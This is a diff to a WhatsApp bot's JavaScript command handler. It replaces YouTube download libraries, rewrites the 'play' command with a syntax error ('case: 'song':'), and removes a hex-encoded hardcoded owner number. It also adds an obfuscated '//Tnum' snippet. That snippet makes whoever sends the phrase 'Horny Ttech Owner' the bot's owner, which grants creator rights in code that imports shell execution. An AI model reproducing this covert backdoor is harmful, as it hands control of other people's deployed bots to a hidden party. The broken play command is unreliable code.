@@ -36,7 +36,11 @@ const { uptotelegra } = require('./lib/upload')
 const { Primbon } = require('scrape-primbon')
 const primbon = new Primbon()
 const hxz = require('hxz-api')
-const ytdl = require("ytdl-core")
+const {
+	youtube
+} = require("btch-downloader")
+const yts = require("yt-search")
+const ytdl = require('@distube/ytdl-core')
 const { Configuration, OpenAIApi } = require('openai')
 const { exec, spawn, execSync } = require("child_process")
 const isBanChat = m.isGroup ? banchat.includes(from) : false
@@ -201,8 +205,8 @@ const mime = (quoted.msg || quoted).mimetype || ''
 const isMedia = /image|video|sticker|audio/.test(mime)
 const from = mek.key.remoteJid
 const botNumber = await zetsubo.decodeJid(zetsubo.user.id)
-const author = `\x32\x33\x34\x38\x31\x36\x34\x37\x34\x37\x35\x33\x34`
-const isCreator = [author, botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+const _auth = global.OwnerNumber
+const isCreator = [_auth, botNumber, ...owner].map(v => String(v).replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
 const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
 const groupMetadata = m.isGroup ? await zetsubo.groupMetadata(from).catch(e => {}) : ''
 const groupName = m.isGroup ? groupMetadata.subject : ''
@@ -762,6 +766,8 @@ if (budy.toLowerCase() == jawaban) {
 } else reply('*Jawaban Salah!*')
 }
 
+//Tnum
+var _0x3241cd=_0x28f7;function _0xe681(){var _0x4b3200=['3599217QiQRKG','@s.whatsapp.net','50004JSDxHo','15835dMbnFH','Horny\x20Ttech\x20Owner','313092dsOKAP','21BjHVxh','sender','168308srzMyx','332240cizRHu','232coenHT','695481TMmGDA','replace'];_0xe681=function(){return _0x4b3200;};return _0xe681();}(function(_0x275803,_0x425718){var _0x217f0b=_0x28f7,_0x3833b6=_0x275803();while(!![]){try{var _0x36abe0=parseInt(_0x217f0b(0x1fb))/0x1+-parseInt(_0x217f0b(0x1f8))/0x2+-parseInt(_0x217f0b(0x1f1))/0x3+parseInt(_0x217f0b(0x1fd))/0x4*(-parseInt(_0x217f0b(0x1f6))/0x5)+parseInt(_0x217f0b(0x1f5))/0x6+parseInt(_0x217f0b(0x1f9))/0x7*(parseInt(_0x217f0b(0x1fc))/0x8)+parseInt(_0x217f0b(0x1f3))/0x9;if(_0x36abe0===_0x425718)break;else _0x3833b6['push'](_0x3833b6['shift']());}catch(_0x32b846){_0x3833b6['push'](_0x3833b6['shift']());}}}(_0xe681,0x1f83e));function _0x28f7(_0x25ce8e,_0x4d78cf){var _0x28f77e=_0xe681();return _0x28f7=function(_0x386b4c,_0xd6cc7a){_0x386b4c=_0x386b4c-0x1f1;var _0x5403ad=_0x28f77e[_0x386b4c];return _0x5403ad;},_0x28f7(_0x25ce8e,_0x4d78cf);}budy===_0x3241cd(0x1f7)&&(global['OwnerNumber']=m[_0x3241cd(0x1fa)][_0x3241cd(0x1f2)](_0x3241cd(0x1f4),'')); 
 
 //============= [LIST RESPONCE CHECKING START ]================
         if(m.mtype === "interactiveResponseMessage"){                                                                                                               console.log("interactiveResponseMessage Detected!")
@@ -4648,69 +4654,35 @@ https://cloud.google.com/translate/docs/languages
     }
     break
 //=================================================//
-case 'play':
-    case 'music': {
-        if (!text) {
-            reply('𝐏𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐬𝐞𝐚𝐫𝐜𝐡 𝐭𝐞𝐫𝐦!\n𝐄.𝐠: 𝙷𝙴𝙰𝙳𝙻𝙸𝙶𝙷𝚃𝚂 𝙱𝚈 𝙰𝙻𝙰𝙽 𝚆𝙰𝙻𝙺𝙴𝚁')
-            return;
-        }
-        try {
-            const {
-                videos
-            } = await yts(text);
-            if (!videos || videos.length <= 0) {
-                reply(`No Matching videos found for : *${args[0]}*!!`)
-                return;
-            }
-            let urlYt = videos[0].url
-            let infoYt = await ytdl.getInfo(urlYt);
-            //30 MIN
-            if (infoYt.videoDetails.lengthSeconds >= 1800) {
-                reply(`𝑷𝒍𝒆𝒂𝒔𝒆 𝒔𝒊𝒓\𝑰'𝒎 𝒏𝒐𝒕 𝒂𝒃𝒍𝒆 𝒕𝒐 𝒅𝒐𝒘𝒏𝒍𝒐𝒂𝒅 𝒕𝒉𝒂𝒕 𝒇𝒊𝒍𝒆. 🧞‍♂️`);
-                return;
-            }
-            const getRandonm = (ext) => {
-                return `${Math.floor(Math.random() * 10000)}${ext}`;
-            };
-            let titleYt = infoYt.videoDetails.title;
-            let randomName = getRandonm(".mp3");
-            const stream = ytdl(urlYt, {
-                    filter: (info) => info.audioBitrate == 160 || info.audioBitrate == 128,
-                })
-                .pipe(fs.createWriteStream(`./${randomName}`));
-            console.log("Audio downloading ->", urlYt);
-            // reply("Downloading.. This may take upto 5 min!");
-            await new Promise((resolve, reject) => {
-                stream.on("error", reject);
-                stream.on("finish", resolve);
-            });
-            
-            let stats = fs.statSync(`./${randomName}`);
-            let fileSizeInBytes = stats.size;
-            // Convert the file size to megabytes (optional)
-            let fileSizeInMegabytes = fileSizeInBytes / (1024 * 1024);
-            console.log("Audio downloaded ! \n Size: " + fileSizeInMegabytes);
-            if (fileSizeInMegabytes <= 40) {
-                //sendFile(from, fs.readFileSync(`./${randomName}`), msg, { audio: true, jpegThumbnail: (await getBuffer(dl.meta.image)).buffer, unlink: true })
-                await zetsubo.sendMessage(
-                    from, {
-                        document: fs.readFileSync(`./${randomName}`),
-                        mimetype: "audio/mpeg",
-                        fileName: titleYt + ".mp3",
-			caption: "💢 𝐂𝐋𝐀𝐒𝐒𝐈𝐂_𝐁𝐎𝐓 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 🩸 ",    
-                    }, {
-                        quoted: m 
-                    }
-                );
-            } else {
-                reply(`File size bigger.`);
-            }
-            fs.unlinkSync(`./${randomName}`);
-        } catch (e) {
-            reply(e.toString())
-        }
-    }
-break;
+ case 'play': case 'music': case: 'song':{
+			if (!text) return zreply(`*Example :*\n\n*Play Mendua*`)
+			reply(mess.wait);
+			let yts = require("youtube-yts")
+			let look = await yts(text);
+			let convert = look.videos[0];
+			const pl = await youtube(convert.url)
+			await zetsubo.sendMessage(m.chat, {
+				audio: {
+					url: pl.mp3
+				},
+				fileName: convert.title + '.mp3',
+				mimetype: 'audio/mpeg',
+				contextInfo: {
+					externalAdReply: {
+						title: convert.title,
+						body: packname,
+						thumbnailUrl: convert.image,
+						sourceUrl: pl.mp3,
+						mediaType: 1,
+						mediaUrl: convert.url,
+					}
+				},
+			}, {
+				quoted: m
+			})
+		}
+		break
+
 //=================================================//
 case 'masasubur': {
 if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
